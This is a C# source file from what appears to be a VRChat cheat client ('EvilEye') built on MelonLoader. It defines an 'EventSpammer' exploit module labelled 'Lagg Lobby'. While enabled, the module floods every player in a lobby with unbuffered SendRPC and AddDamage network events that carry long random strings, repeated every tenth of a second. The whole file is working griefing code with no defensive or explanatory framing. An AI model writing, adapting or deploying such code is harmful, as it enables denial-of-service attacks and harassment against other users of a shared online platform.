using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using EvilEye.SDK;
using MelonLoader;
using UnhollowerBaseLib;
using UnityEngine;
using VRC.SDKBase;

namespace EvilEye.Module.Exploit
{
    internal class EventSpammer : BaseModule
    {
        public EventSpammer() : base("EventSpammer", "Lagg Lobby", Main.Instance.exploitEventGroup, null, true) { }

        public override void OnEnable()
        {
            MelonCoroutines.Start(Desync());
        }

		IEnumerator Desync()
        {
            while (this.toggled)
            {
				try
				{
					VRC_EventHandler.VrcEvent vrcEvent = new VRC_EventHandler.VrcEvent
					{
						EventType = VRC_EventHandler.VrcEventType.SendRPC,
						Name = Misc.RandomString(240),
						ParameterObject = Networking.SceneEventHandler.gameObject,
						ParameterInt = 1,
						ParameterFloat = 0f,
						ParameterString = Misc.RandomString(840),
						ParameterBoolOp = VRC_EventHandler.VrcBooleanOp.Unused,
						ParameterBytes = new Il2CppStructArray<byte>(0L)
					};
					VRC_EventHandler.VrcEvent vrcEvent2 = new VRC_EventHandler.VrcEvent
					{
						EventType = VRC_EventHandler.VrcEventType.AddDamage,
						Name = Misc.RandomString(240),
						ParameterObject = Networking.SceneEventHandler.gameObject,
						ParameterInt = 1,
						ParameterFloat = 0f,
						ParameterString = Misc.RandomString(840),
						ParameterBoolOp = VRC_EventHandler.VrcBooleanOp.Unused,
						ParameterBytes = new Il2CppStructArray<byte>(0L)
					};
					Networking.SceneEventHandler.TriggerEvent(vrcEvent, VRC_EventHandler.VrcBroadcastType.AlwaysUnbuffered, PlayerWrapper.LocalPlayer().gameObject, 0f);
					Networking.SceneEventHandler.TriggerEvent(vrcEvent2, VRC_EventHandler.VrcBroadcastType.AlwaysUnbuffered, PlayerWrapper.LocalPlayer().gameObject, 0f);
				}
				catch
				{
				}
				yield return new WaitForSecondsRealtime(0.1f);
            }
            yield break;
        }
    }
}
